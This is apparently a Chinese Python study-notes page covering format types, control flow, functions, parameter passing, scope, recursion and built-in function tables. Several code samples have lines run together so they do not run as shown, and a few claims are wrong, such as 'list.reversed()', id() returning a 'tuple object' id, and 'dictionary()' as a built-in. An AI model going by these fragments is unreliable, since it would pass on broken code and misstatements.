<li>&lt;类型&gt; 对于整数,输出格式包括一下6种<br> (1) b: 输出整数的二进制形式<br> (2) c: 输出整数对应的Unicode字符<br> (3) d: 输出整数的十进制形式<br> (4) o: 输出整数的八进制形式<br> (5) x: 输出整数的小写十六进制方式<br> (6) X: 输出整数的大写十六进制方式<br> 对于浮点数类型:<br> (1) e: 输出浮点数对应的小写字母e的指数形式<br> (2) E: 输出浮点数对应的大写字母E的指数形式<br> (3) f: 输出浮点数的标准浮点形式<br> (4) %: 输出浮点数的百分形式<br> 注:输出浮点数尽量 &lt;.精度&gt; 表示小数部分的宽度,更好控制输出格式</li>
</ol>
<h1 id="第三章-控制语句（程序的基本结构）"><a href="#第三章-控制语句（程序的基本结构）" class="headerlink" title="第三章 控制语句（程序的基本结构）"></a>第三章 控制语句（程序的基本结构）</h1><p>程序基本结构组成: 顺序结构,分支结构和循环结构</p>
<h2 id="3-1-分支结构"><a href="#3-1-分支结构" class="headerlink" title="3.1 分支结构"></a>3.1 分支结构</h2><p>python的关系操作符</p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>&lt;</td>
<td>小于</td>
</tr>
<tr>
<td>&lt;&#x3D;</td>
<td>小于或等于</td>
</tr>
<tr>
<td>&gt;&#x3D;</td>
<td>大于或等于</td>
</tr>
<tr>
<td>&gt;</td>
<td>大于</td>
</tr>
<tr>
<td>&#x3D;&#x3D;</td>
<td>等于</td>
</tr>
<tr>
<td>!&#x3D;</td>
<td>不等于</td>
</tr>
</tbody></table>
<p>&#x3D;&#x3D;注意:<br>1.使用’&#x3D;‘表示赋值语句,使用’&#x3D;&#x3D;’ 表示等于<br>2. 字符串比较依次按照字典顺序进行,英文大写字符对于unicode编码比小写字符小&#x3D;&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;&quot;Python&quot; &gt; &quot;python&quot;</span><br><span class="line">False</span><br></pre></td></tr></table></figure>

<h3 id="1-单分支结构-if"><a href="#1-单分支结构-if" class="headerlink" title="1. 单分支结构 if"></a>1. 单分支结构 if</h3><p>格式:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if &lt;条件&gt;:&lt;语句&gt;</span><br></pre></td></tr></table></figure>

<h3 id="2-二分支结构-if-else"><a href="#2-二分支结构-if-else" class="headerlink" title="2.二分支结构 if-else"></a>2.二分支结构 if-else</h3><p>格式1:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if &lt;条件&gt;:&lt;语句1&gt;</span><br><span class="line">else:&lt;语句2&gt;</span><br></pre></td></tr></table></figure>

<p>格式2:紧凑结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;表达式1&gt; if &lt;条件&gt; else &lt;表达式2&gt;</span><br><span class="line">#表达式1,2 一般是数字类型或字符串类型中的一个值</span><br></pre></td></tr></table></figure>

<h3 id="3-多分支机构-if-elif-else"><a href="#3-多分支机构-if-elif-else" class="headerlink" title="3. 多分支机构 if-elif-else"></a>3. 多分支机构 if-elif-else</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if &lt;条件1&gt;:&lt;语句1&gt;</span><br><span class="line">elif &lt;条件2&gt;:&lt;语句2&gt;</span><br><span class="line">else:&lt;语句3&gt;</span><br><span class="line">#elif 可以多个</span><br></pre></td></tr></table></figure>

<h2 id="3-2-循环结构"><a href="#3-2-循环结构" class="headerlink" title="3.2 循环结构"></a>3.2 循环结构</h2><h3 id="1-遍历循环-for"><a href="#1-遍历循环-for" class="headerlink" title="1.遍历循环 for"></a>1.遍历循环 for</h3><p>格式:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &lt;循环变量&gt; in &lt;遍历结构&gt;:&lt;语句&gt;</span><br></pre></td></tr></table></figure>

<p>遍历结构可以是 &#x3D;&#x3D;字符串,文件,组合数字类型或range()函数 等&#x3D;&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 循环n次</span><br><span class="line">for i in range(n):# 遍历文件fi的每一行</span><br><span class="line">for line in fi :# 遍历字符串s</span><br><span class="line">for c in s:# 遍历列表ls</span><br><span class="line">for ltem inls:</span><br></pre></td></tr></table></figure>

<h3 id="2-无限循环-while"><a href="#2-无限循环-while" class="headerlink" title="2.无限循环 while"></a>2.无限循环 while</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">while &lt;条件&gt;:&lt;语句&gt;</span><br><span class="line">#其中 条件与if  中判断条件一样,结果为 True或False</span><br></pre></td></tr></table></figure>

<h3 id="3-循环保留字-break-和-continue"><a href="#3-循环保留字-break-和-continue" class="headerlink" title="3.循环保留字 break 和 continue"></a>3.循环保留字 break 和 continue</h3><p>break : 跳出最内层for或while循环<br>continue : 结束当前当次循环,继续循环条件中的未执行语句</p>
<h3 id="4-for和while的扩展模式"><a href="#4-for和while的扩展模式" class="headerlink" title="4. for和while的扩展模式"></a>4. for和while的扩展模式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for &lt;循环变量&gt; in &lt;遍历结构&gt;:&lt;语句&gt;</span><br><span class="line">else:&lt;语句2&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">while &lt;条件&gt;:&lt;语句&gt;</span><br><span class="line">else :&lt;语句2&gt;</span><br></pre></td></tr></table></figure>

<p>for循环和while循环中都存在一个else扩展用法。else中的语句块只在一种条<br>件下执行，即循环正常遍历了&#x3D;&#x3D;所有内容或由于条件不成立而结束循环&#x3D;&#x3D;，没有因为<br>break 或returm(函数返回中使用的保留字)而退出。<br>&#x3D;&#x3D;continue保留字对else 没有影响&#x3D;&#x3D;</p>
<h1 id="第四章-函数与模块"><a href="#第四章-函数与模块" class="headerlink" title="第四章 函数与模块"></a>第四章 函数与模块</h1><h2 id="4-1-函数的基本使用"><a href="#4-1-函数的基本使用" class="headerlink" title="4.1 函数的基本使用"></a>4.1 函数的基本使用</h2><h3 id="4-1-1-函数的定义"><a href="#4-1-1-函数的定义" class="headerlink" title="4.1.1 函数的定义"></a>4.1.1 函数的定义</h3><ol>
<li>创建函数<br> 在 Python 中，使用 def 关键字定义函数：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def happy():print(&quot;happy&quot;)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>调用函数<br> 如需调用函数，请使用函数名称后跟括号：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def happy():print(&quot;happy&quot;)happy()</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>lambda函数 -匿名函数<br> 函数可接受任意数量的参数，但只能有一个表达式。<br> 格式: &lt;函数名&gt; &#x3D; lambda &lt;参数列表 &gt; : &lt;表达式&gt;</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = lambda a, b : a * b</span><br><span class="line">print(x(5, 6))</span><br><span class="line">&gt;30</span><br><span class="line">type(x)</span><br><span class="line">&gt; &lt;class &#x27;function&gt;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>传递函数的参数<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">squares</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x**<span class="number">2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">func,seq</span>):</span><br><span class="line">    <span class="keyword">return</span> [func(eachNum) <span class="keyword">for</span> eachNum <span class="keyword">in</span> seq]</span><br><span class="line">num=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(convert(squares,num))</span><br></pre></td></tr></table></figure></li>
<li>Python 程序里不一定要有一个主函数</li>
</ol>
<h3 id="4-1-2-函数的参数传递"><a href="#4-1-2-函数的参数传递" class="headerlink" title="4.1.2 函数的参数传递"></a>4.1.2 函数的参数传递</h3><ol>
<li><p>&#x3D;&#x3D;可选参数必须定义在非可选参数的后面&#x3D;&#x3D;,可选参数带有默认值，默认值参数应该跟在没有默认值的参数后面,&#x3D;&#x3D;可变参数应该在不可变参数后面&#x3D;&#x3D;。</p>
</li>
<li><p>&#x3D;&#x3D;可变参数&#x3D;&#x3D;<br> 可变参数*args 和 **kwargs<br>  定义函数时候，参数*args在前，**kwargs在后，*args和**kwargs组合起来可以传入任意的参数。<br> *args参数：可接受任意个位置参数，当函数调用时，所有未使用（未匹配）的位置参数会在函数内自动组装进一个tuple对象中，此tuple对象会赋值给变量名args。<br> **kwargs参数：可接受任意个关键字参数，当函数调用时，所有未使用（未匹配）的关键字参数会在函数内组装进一个dict对象中，此dict对象会赋值给变量名kwargs。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_var_args</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;args: &quot;</span>, args)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;kwargs: &quot;</span>, kwargs)</span><br><span class="line"></span><br><span class="line">test_var_args(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, name=<span class="string">&quot;test&quot;</span>, age=<span class="number">27</span>)</span><br><span class="line">out：</span><br><span class="line">args:  (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">kwargs:  &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">27</span>&#125;</span><br></pre></td></tr></table></figure>
<p>不解包传参:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">a,*b</span>):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">fun(<span class="number">1</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">out:</span><br><span class="line">([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],)</span><br></pre></td></tr></table></figure>
<p>解包传参：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greeting</span>(<span class="params">args1, *tupleArgs, **dictArgs</span>):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(args1)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(tupleArgs)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(dictArgs)</span><br><span class="line"></span><br><span class="line">names = [<span class="string">&#x27;HTY&#x27;</span>, <span class="string">&#x27;LFF&#x27;</span>, <span class="string">&#x27;ZH&#x27;</span>]</span><br><span class="line"></span><br><span class="line">info = &#123;<span class="string">&#x27;schoolName&#x27;</span> : <span class="string">&#x27;NJRU&#x27;</span>, <span class="string">&#x27;City&#x27;</span> : <span class="string">&#x27;Nanjing&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">greeting(<span class="string">&#x27;Hello,&#x27;</span>, *names, **info)</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以设计可变数量的参数,通过在参数前加 &#x3D;&#x3D;*&#x3D;&#x3D;实现,带星的可变参数只能放在参数列表最好,调用时这些参数被当成 &#x3D;&#x3D;元组&#x3D;&#x3D; 类型传递</p>
</li>
<li><p>传参 :<br> 位置传参:调用时按照位置输入参数<br> 名称传参:按照形参名称输入实参,顺序可以任意调整</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt;&gt;&gt; func(x1,x2,x3,x4)</span><br><span class="line">#位置传参</span><br><span class="line">&gt;&gt;&gt;result = func(1,2,3,4)</span><br><span class="line">#名称传参:</span><br><span class="line">&gt;&gt;&gt; result = func( x1=1,x3=3,x2=2,x4=4)</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>函数返回值 return<br> 可返回0个,1个或者多个结果<br> 返回多个结果时,以 &#x3D;&#x3D;元组类型&#x3D;&#x3D; 保存<br> 函数可以没有return,此时不返回值</p>
</li>
<li><p>pass 语句<br> 函数定义不能为空，但是如果您出于某种原因写了无内容的函数定义，请使用 pass 语句来避免错误。</p>
</li>
<li><p>&#x3D;&#x3D;变量的作用域&#x3D;&#x3D;<br> 全局变量: 定义在函数外,不缩进<br> 局部变量: 函数内部定义使用, &#x3D;&#x3D;只在函数内部有效,函数结束后,局部变量被释放&#x3D;&#x3D;</p>
</li>
<li><p>Python参数传递时不构造新数据对象，而是让形式参数和实际参数共享同一对象</p>
</li>
<li><p>关键字参数必须位于位置参数之后</p>
</li>
<li><p>Python支持按照位置传参也支持名称传参，但不支持地址传参</p>
</li>
<li><p>对于组合数据类型的全局变量（例如列表、字典、集合等），即使在函数内部没有被真实创建的同名变量，函数内部也可以直接使用并修改全局变量的值。</p>
</li>
<li><p>局部变量可以与全局变量重名,但函数内局部变量不改变全局变量的值</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">total = 0 # 这是一个全局变量def sum( arg1, arg2 ):total = arg1 + arg2 # total在这里是局部变量.print (&quot;函数内是局部变量 : &quot;, total)# 这里输出的是30return totalsum( 10, 20 )</span><br><span class="line">print (&quot;函数外是全局变量 : &quot;, total)</span><br><span class="line"># 输出全局变量 0</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>简单数据类型变量用 &#x3D;&#x3D;global&#x3D;&#x3D; 声明后,作为全局变量使用,函数退出后 &#x3D;&#x3D;变量保留且值被函数改变&#x3D;&#x3D;</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def myfunc():global xx = 100myfunc()</span><br><span class="line">print(x)</span><br><span class="line">&gt;100</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>组合数据类型的全局变量 (列表字典),如果在函数内部没有被真实创建的同名变量,则函数内部可以中间使用并修改全局变量的值, 如果函数内部存在同名真实创建的列表,则函数使用该列表不会改变全局变量</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls = []</span><br><span class="line">def f( a ,b ):li.append(b) #将局部变量b增加到全局变量ls中return a*b</span><br><span class="line">s = f ( &quot;kno~&quot;,2)</span><br><span class="line">print( s ,ls)</span><br><span class="line">#输出 kno~kno~ [2]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls = [ ]#全局变量ls</span><br><span class="line">def f( a ,b ):ls = [] #同名的局部变量 lsli.append(b) #将局部变量b增加到局部变量ls中return a*b</span><br><span class="line">s = f ( &quot;kno~&quot;,2)</span><br><span class="line">print( s ,ls)</span><br><span class="line"># 输出 kno~kno~ []</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;可变类型作为默认参数&#x3D;&#x3D;</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, lst=[]</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(lst))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> x <span class="keyword">not</span> <span class="keyword">in</span> lst:</span><br><span class="line"></span><br><span class="line">        lst.append(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lst</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    list1 = add(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(list1)</span><br><span class="line">    </span><br><span class="line">    list2 = add(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(list2)</span><br><span class="line">    </span><br><span class="line">    list3 = add(<span class="number">3</span>, [<span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>])</span><br><span class="line">    <span class="built_in">print</span>(list3)</span><br><span class="line">    </span><br><span class="line">    list4 = add(<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">print</span>(list4)</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="number">2821692569152</span> </span><br><span class="line">[<span class="number">1</span>] </span><br><span class="line"><span class="number">2821692569152</span> </span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>] </span><br><span class="line"><span class="number">2821692569600</span> </span><br><span class="line">[<span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>] </span><br><span class="line"><span class="number">2821692569152</span> </span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure>
<p>在一个程序周期内，默认参数不传入时只会被创建一次。<br>用一下代码解决：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, lst=<span class="literal">None</span></span>): </span><br><span class="line">	<span class="keyword">if</span> lst <span class="keyword">is</span> <span class="literal">None</span>: </span><br><span class="line">		lst = [] </span><br><span class="line">	<span class="keyword">if</span> x <span class="keyword">not</span> <span class="keyword">in</span> lst: </span><br><span class="line">		lst.append(x) </span><br><span class="line">	<span class="keyword">return</span> lst</span><br></pre></td></tr></table></figure>
<h2 id="4-2-函数递归"><a href="#4-2-函数递归" class="headerlink" title="4.2.函数递归"></a>4.2.函数递归</h2><ol>
<li>&#x3D;&#x3D;使用递归一定要有基例的构建,可以多个基例&#x3D;&#x3D;,基例决定递归的深度  </li>
<li>递归函数必须有基例，递归函数的基例决定递归的深度，每个递归函数不一定只有一个基例</li>
<li>&#x3D;&#x3D;递归函数的基例不在进行递归&#x3D;&#x3D;</li>
<li>默认情况调用1000层,python解释器终止程序,<br>若需要超过1000层,可用下面代码设定<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.setrecursionlimit(2000)  #2000是新的递归层数</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="4-3-代码复用和模块化设计"><a href="#4-3-代码复用和模块化设计" class="headerlink" title="4.3 代码复用和模块化设计"></a>4.3 代码复用和模块化设计</h2><p>基本要求:<br>1.紧耦合: 功能块内部耦合紧密<br>2.松耦合: 功能块之间耦合度底</p>
<h2 id="4-3常用函数解析"><a href="#4-3常用函数解析" class="headerlink" title="4.3常用函数解析"></a>4.3常用函数解析</h2><ol>
<li>hasattr(object,name)）<br> 判断对象object是否包含名为name的特性（hasattr是通过调用getattr(object,name)是否抛出异常来实现的）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hasattr(list,&#x27;add&#x27;)</span><br><span class="line">Out[4]: False</span><br><span class="line">hasattr(list,&quot;append&quot;)</span><br><span class="line">Out[5]: True</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>all(x)<br> x为组合类型数据,可迭代对象（列表、元组、字典）<br> 如果其中全部元素为True,则都返回True,否则False<br> 注意: &#x3D;&#x3D;整数0,空字符串””,空列表[]等都当初False</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">检查列表中的所有项目是否为 True：mylist = [0, 1, 1]</span><br><span class="line">x = all(mylist)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>any()<br> 与all()相反,只要组合数据类型有一个是True,则返回True,全部元素为False,则返回False</p>
</li>
<li><p>id()<br>返回&#x3D;&#x3D;元组对象的唯一 id&#x3D;&#x3D;,可以通过比较两个变量编号是否相同判断数据是否一致</p>
</li>
<li><p>reversed()返回组合数据类型的逆序形式<br>list.reversed()无返回，直接修改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">反转列表的顺序，并打印每个项目：alph = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;]</span><br><span class="line">ralph = reversed(alph)</span><br><span class="line">for x in ralph:print(x)</span><br></pre></td></tr></table></figure>
</li>
<li><p>sorted(iterable, key&#x3D;key, reverse&#x3D;reverse)<br> 对一个系列进行排序,默认从小到大<br> 参数 描述<br> iterable 必需。要排序的序列，列表、字典、元组等等。<br> key可选。执行以确定顺序的函数。默认为 None。<br> reverse可选。布尔值。False 将按升序排序，True 将按降序排序。默认为 False。</p>
</li>
<li><p>type() 返回数据对应类型</p>
</li>
</ol>
<h2 id="4-4-python内置函数68个"><a href="#4-4-python内置函数68个" class="headerlink" title="4.4 python内置函数68个"></a>4.4 python内置函数68个</h2><h4 id="1-数学运算："><a href="#1-数学运算：" class="headerlink" title="1.数学运算："></a>1.数学运算：</h4><table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>abs()</td>
<td>求数值的绝对值</td>
</tr>
<tr>
<td>divmod()</td>
<td>返回两个数值的商和余数</td>
</tr>
<tr>
<td>max()</td>
<td>返回可迭代对象哄的元素中的最大值或者所有参数的最大值</td>
</tr>
<tr>
<td>min()</td>
<td>返回可迭代对象哄的元素中的最大值或者所有参数的最小值</td>
</tr>
<tr>
<td>pow()</td>
<td>返回两个数值的幂运算或者其与指定整数的模值</td>
</tr>
<tr>
<td>round()</td>
<td>对浮点数进行四舍五入值</td>
</tr>
<tr>
<td>sum()</td>
<td>对元素类型是数值的可迭代对象中的每个元素求和</td>
</tr>
</tbody></table>
<h4 id="2-类型转换："><a href="#2-类型转换：" class="headerlink" title="2.类型转换："></a>2.类型转换：</h4><table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>bool()</td>
<td>根据传入的参数的逻辑值创建一个新的布尔值</td>
</tr>
<tr>
<td>int()</td>
<td>根据传入的参数创建一个新的整数</td>
</tr>
<tr>
<td>float()</td>
<td>根据传入的参数创建一个新的浮点数</td>
</tr>
<tr>
<td>complex()</td>
<td>根据传入的参数创建一个新的复数</td>
</tr>
<tr>
<td>str()</td>
<td>返回一个对象的字符串表现形式</td>
</tr>
<tr>
<td>bytearray()</td>
<td>根据传入的参数创建一个新的字节数组</td>
</tr>
<tr>
<td>bytes()</td>
<td>根据传入的参数创建一个新的不可变字节数组</td>
</tr>
<tr>
<td>memoryview()</td>
<td>根据传入的参数创建一个新的内存查看对象</td>
</tr>
<tr>
<td>ord()</td>
<td>返回Unicode字符对应的整数</td>
</tr>
<tr>
<td>chr()</td>
<td>返回整数所对应的Unicode字符</td>
</tr>
<tr>
<td>bin()</td>
<td>将整数转化为2进制字符串</td>
</tr>
<tr>
<td>oct()</td>
<td>将整数转化为8进制字符串</td>
</tr>
<tr>
<td>hex()</td>
<td>将整数转化为16进制字符串</td>
</tr>
<tr>
<td>tuple()</td>
<td>根据传入的参数创建一个新的元组</td>
</tr>
<tr>
<td>list()</td>
<td>根据传入的参数创建一个新的列表</td>
</tr>
<tr>
<td>dictionary（）</td>
<td>根据传入的参数创建一个新的字典</td>
</tr>
<tr>
<td>set()</td>
<td>根据传入的参数创建一个新的集合</td>
</tr>
<tr>
<td>frozenset()</td>
<td>根据传入的参数创建一个不可变集合</td>
</tr>
<tr>
<td>enumerate()</td>
<td>根据可迭代对象创建枚举对象</td>
</tr>
<tr>
<td>range()</td>
<td>根据传入的参数创建一个新的range对象</td>
</tr>
<tr>
<td>iter()</td>
<td>根据传入的参数创建一个新的可迭代对象</td>
</tr>
<tr>
<td>slice()</td>
<td>根据传入的参数创建一个新的切片对象</td>
</tr>
<tr>
<td>super()</td>
<td>根据传入的参数创建一个新的子类和父类关系的代理对象</td>
</tr>
<tr>
<td>object()</td>
<td>创建一个新的object对象</td>
</tr>
</tbody></table>
<h4 id="3-序列操作："><a href="#3-序列操作：" class="headerlink" title="3.序列操作："></a>3.序列操作：</h4><table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>all()</td>
<td>判断可迭代对象的每个元素是否都为True值</td>
</tr>
<tr>
<td>any()</td>
<td>判断可迭代对象的元素是否为True值的元素</td>
</tr>
<tr>
<td>filter()</td>
<td>使用指定方法过滤可迭代对象的元素</td>
</tr>
<tr>
<td>map()</td>
<td>使用指定方法取作用传入的每个迭代对象的元素，生成新的可迭代对象</td>
</tr>
<tr>
<td>next()</td>
<td>返回可迭代对象的下一个元素值</td>
</tr>
<tr>
<td>reversed()</td>
<td>反转序列生成新的可迭代对象</td>
</tr>
<tr>
<td>sorted()</td>
<td>对可迭代对象进行排序，返回一个新的列表</td>
</tr>
<tr>
<td>zip()</td>
<td>聚合传入的每隔迭代器中的相同位置的元素，返回一个新的元祖类型迭代器</td>
</tr>
</tbody></table>
<h4 id="4-对象操作："><a href="#4-对象操作：" class="headerlink" title="4.对象操作："></a>4.对象操作：</h4><table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>help()</td>
<td>返回对象的帮助信息</td>
</tr>
<tr>
<td>dir()</td>
<td>返回对象或者当前作用域内的属性列表</td>
</tr>
<tr>
<td>id()</td>
<td>返回对象的唯一标识符</td>
</tr>
<tr>
<td>hash()</td>
<td>获取对象的哈希值</td>
</tr>
<tr>
<td>type()</td>
<td>返回对象的类型，或者根据传入的参数创建一个新的类型</td>
</tr>
<tr>
<td>len()</td>
<td>返回对象的长度</td>
</tr>
<tr>
<td>ascii()</td>
<td>返回对象的可打印表字符串表现方式</td>
</tr>
</tbody></table>
<h4 id="5-反射操作："><a href="#5-反射操作：" class="headerlink" title="5.反射操作："></a>5.反射操作：</h4><table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>import</em>()</td>
<td>动态导入模块</td>
</tr>
<tr>
<td>isinstance()</td>
<td>判断对象是否是类或者元祖中任意类元素的实例</td>
</tr>
<tr>
<td>issubclass()</td>
<td>判断类是否是另一个类或者类型元组中任意类元素的子类</td>
</tr>
<tr>
